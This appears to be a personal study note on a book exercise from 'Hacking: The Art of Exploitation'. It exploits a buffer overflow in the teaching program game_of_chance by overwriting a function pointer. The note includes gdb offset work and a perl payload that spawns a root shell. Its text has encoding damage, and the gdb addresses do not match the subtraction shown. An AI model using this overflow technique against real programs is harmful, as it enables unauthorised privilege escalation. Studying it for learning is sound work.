---
book: "Hacking The Art Of Exploitation"
---

Letâ€™s look at the vulnerability.

```c
struct user {
   int uid;
   int credits;
   int highscore;
   char name[100];
   int (*current_game) ();
};
```

Here the `name` is defined with a 100 byte long buffer.

```c
void input_name() {
   char *name_ptr, input_char='\n';
   while(input_char == '\n')    // Flush any leftover 
      scanf("%c", &input_char); // newline chars.
   
   name_ptr = (char *) &(player.name); // name_ptr = player name's address
   while(input_char != '\n') {  // Loop until newline.
      *name_ptr = input_char;   // Put the input char into name field.
      scanf("%c", &input_char); // Get the next char.
      name_ptr++;               // Increment the name pointer.
   }
   *name_ptr = 0;  // Terminate the string.
}
```

We can see that in the input name function, the length of the inputted string is not checked, allowing for a buffer overflow, yey ðŸ˜„

```ad-note
It only stops at a new line. (`input_char != '\n'`)
```

Letâ€™s look at the game selection part of the code:

```c
 if((choice < 1) || (choice > 7))
         printf("\n[!!] The number %d is an invalid selection.\n\n", choice);
      else if (choice < 4) {  // Othewise, choice was a game of some sort.
            if(choice != last_game) { // If the function ptr isn't set
               if(choice == 1)        // then point it at the selected game 
                  player.current_game = pick_a_number;   
               else if(choice == 2)                     
                  player.current_game = dealer_no_match;
               else
                  player.current_game = find_the_ace;
               last_game = choice;   // and set last_game.
            }
            play_the_game();   // Play the game.
         }
```

We can see that if the `last_game` isnâ€™t the same as the choice, then it sets the `current_game` to the appropriate game. This means we have to play once first to have a value in the `last_game` var.

We can figure out with gdb how many bytes there are between the two variables:

```bash
gefâž¤  x/x &player.name
0x5655a08c <player+12>:	0x00000000
gefâž¤  x/x &player.current_game
0x5655a0f0 <player+112>:	0x00000000
gefâž¤  print 0x804b6d0 - 0x804b66c
$1 = 0x64
```

Our final exploit is:

```bash
perl -e 'print "1\n7\nn\n5\n" . "A"x100 . "\x62\xdf\xff\xff\n" . "1\n"' > exploit_buffer  

cat exploit_buffer - | ./game_of_chance 
```

Letâ€™s break this down, first, we print out `"1\n7\nn\n5\n"`, since that allows us to play a game, allowing us to have a value in `current_game`. Then, we use `"A"x100` to fill the buffer.

After that we have our payload address `"\x62\xdf\xff\xff\n"`. For more info on how to get this checkout [[Using ENV for binexp]].

Then we pip all this into an exploit_buffer file.

When piping, we use the `-` character, so we can get back the control to ourselves, meaning we can use the shell we just opened, without this the program just closes.

```bash
whoami
	root
```

Done ðŸ˜Š